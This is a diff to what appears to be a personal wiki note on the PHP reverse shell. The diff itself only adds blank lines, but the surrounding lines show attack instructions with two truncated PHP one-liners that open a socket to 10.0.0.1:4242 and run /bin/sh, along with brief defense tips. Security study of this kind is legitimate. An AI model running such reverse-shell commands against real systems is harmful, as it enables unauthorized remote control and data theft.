@@ -32,6 +32,8 @@ From a technical perspective, the PHP Reverse Shell works by creating a PHP scri
 
 The business value of the PHP Reverse Shell is that it allows attackers to gain remote access to a target system, which can be used to steal sensitive data, install malware, or carry out other malicious activities.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable system
@@ -39,6 +41,8 @@ The business value of the PHP Reverse Shell is that it allows attackers to gain 
 1. Knowledge of the target system's IP address and port number
 
 1. A web server with PHP installed
+
+ 
 
 ## Defense
 
@@ -48,23 +52,39 @@ The business value of the PHP Reverse Shell is that it allows attackers to gain 
 
 1. Use network segmentation to limit the impact of a compromised system
 
+ 
+
 ## Objectives
 
 1. Establish a reverse shell connection to a target system
 
 1. Execute commands on the target system as if you were sitting in front of it
 
+ 
+
 # Instructions
 
 1. Execute a reverse shell using PHP
 
+ 
+
+
+
 **Code**: [[php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bi]]
+
+
 
 > This command will establish a reverse shell connection to the specified IP address and port number using PHP. It uses the fsockopen() function to open a socket connection and then executes the /bin/sh shell with input/output redirection to establish the reverse shell. The shell can be accessed by the attacker from the listener on the specified IP address and port number.
 
 2. To establish a reverse shell connection with a target machine, run the following command in your terminal.
 
+ 
+
+
+
 **Code**: [[php -r '$sock=fsockopen("10.0.0.1",4242);$proc=pro]]
+
+
 
 > This command uses PHP to create a socket connection with the target machine at IP address 10.0.0.1 on port 4242. It then opens a shell process on the target machine by executing the /bin/sh -i command. The shell process is connected to the socket using the $pipes variable, which allows for two-way communication between your machine and the target machine. This command can be used to gain remote access to a target machine and execute commands on it.
 
@@ -83,3 +103,5 @@ The business value of the PHP Reverse Shell is that it allows attackers to gain 
 - [[PHP]]
 - [[Reverse Shell]]
 - [[Reverse Shell Cheat Sheet]]
+
+
